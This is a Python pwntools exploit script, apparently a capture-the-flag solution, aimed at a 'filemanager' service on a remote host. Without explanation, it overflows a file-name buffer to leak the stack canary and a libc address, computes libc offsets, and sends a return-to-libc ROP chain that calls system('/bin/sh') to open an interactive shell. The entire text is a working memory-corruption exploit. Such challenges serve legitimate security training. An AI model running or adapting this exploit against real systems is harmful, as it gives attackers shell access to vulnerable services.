from pwn import *

# r = process('./filemanager')
r = remote("cat.moe", 8002)


payload = b""
payload += b"A" * 10
payload += b"B" * 1000
payload += b"C"

r.sendafter(b"Input file name: ", payload)
r.recvuntil(b"BBBBC")

canary = u64(b"\x00" + r.recv(7))
log.success(f"canary : {hex(canary)}")

payload = b""
payload += b"A" * 10
payload += b"B" * 1000
payload += b"C" * 8
payload += b"D" * 8

r.sendafter(b"Continue? (y/n): ", b"y")
r.sendline()

# gdb.attach(r)

r.sendafter(b"Input file name: ", payload)

r.recvuntil(b"D" * 8)
libc_ret_main = u64(r.recv(6) + b"\x00\x00")
log.success(f"libc_ret_main : {hex(libc_ret_main)}")

libc_base = libc_ret_main - 0x29D90
system_addr = libc_base + 0x50D60
binsh_addr = libc_base + 0x1D8698
pr = libc_base + 0x2A3E5
ret = libc_base + 0x29CD6

payload = b""
payload += b"A" * 10
payload += b"B" * 1000
payload += p64(canary)
payload += b"D" * 8
payload += p64(ret)
payload += p64(pr)
payload += p64(binsh_addr)
payload += p64(system_addr)

r.sendafter(b"Continue? (y/n): ", b"y")
r.sendline()

r.sendafter(b"Input file name: ", payload)

r.sendafter(b"Continue? (y/n): ", b"n")
r.sendline()

r.interactive()
